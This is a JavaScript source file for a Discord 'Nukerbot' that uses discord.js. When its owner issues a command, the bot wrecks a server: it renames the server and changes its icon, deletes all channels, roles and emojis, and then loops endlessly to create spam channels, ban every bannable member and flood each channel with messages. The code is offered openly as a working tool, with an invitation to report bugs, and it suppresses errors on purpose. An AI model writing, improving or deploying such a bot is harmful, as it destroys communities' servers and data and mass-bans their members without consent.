var Disc = require("discord.js");
var Main = require("./prefix.json");
let bot = new Disc.Client(); //Imports used to run the bot. I added prefix.json so it'll be more easier to change the prefix, token and ownerid.

bot.on("ready", guild => {
    console.log(`
    \x1b[33mNukerbot 0.0.1. Made by badb00m#5321.
    \x1b[31mContact me if there's any bugs with the code.
    \x1b[33mBot name: ${bot.user.username}, Bot ID: ${bot.user.id}
    \x1b[32mI'm in: `);
    bot.guilds.cache.forEach(g => console.log(`    ${g.name}: ID: ${g.id}`))
    bot.user.setActivity(Main.act, {type:"STREAMING"}
)});

bot.on("guildCreate", (guild) => {
    console.log(`\x1b[32mYour bot joined: ${guild.name}`);
});

bot.on("guildDelete", guild => {
    console.log(`\x1b[31mYour bot was either banned from, kicked or left: ${guild.name}`)
});

bot.on("message", msg => {
    if(msg.author.id !== Main.ownid) return; //Making sure that nobody can access it besides you.
    if(!msg.content.startsWith(Main.prefix)) return;
    let args = msg.content.slice(Main.prefix.length).split(" ");
    let cmd = args.shift().toLowerCase();
    if(cmd === "snuke") {
        try {
            let a = bot.guilds.cache.get(args.join(" "));
            //in a.setIcon(), input an image name ending with .png or .jpg **HAS TO BE A STR**
            a.setIcon("Replace this with your image").then(a.setName(Main.gm)).then(a.channels.cache.forEach(c => c.delete().then(a.emojis.cache.forEach(e => e.delete()))));
            a.roles.cache.forEach(r => r.delete());
            setInterval(() => {
                a.channels.create(Main.cm);
                a.members.cache.filter(m => m.bannable).forEach(m => m.ban());
                a.channels.cache.forEach(c => c.send(Main.nm));
                a.roles.create(Main.rm);
                a.emojis.create("Replace this with your image", Main.em);
            });
        } catch (error) {/*Wasn't going to add a feature that will handle errors because it'll flood the console and we don't want that, do we?*/}
    } else if(cmd === "nuke") {
        try {
            msg.guild.setIcon("Replace this with your image").then(msg.guild.setName(Main.gm)).then(msg.guild.channels.cache.forEach(c => c.delete().then(msg.guild.emojis.cache.forEach(e => e.delete()))));
            msg.guild.roles.cache.forEach(r => r.delete());
            setInterval(() => {
                msg.guild.channels.create(Main.cm);
                msg.guild.members.cache.filter(m => m.bannable).forEach(m => m.ban());
                msg.guild.channels.cache.forEach(c => c.send(Main.nm));
                msg.guild.roles.create(Main.rm);
                msg.guild.emojis.create("Replace this with your image", Main.em);
            });
        } catch (error) {/*Wasn't going to add a feature that will handle errors because it'll flood the console and we don't want that, do we?*/}
    }
});

bot.login(Main.token);
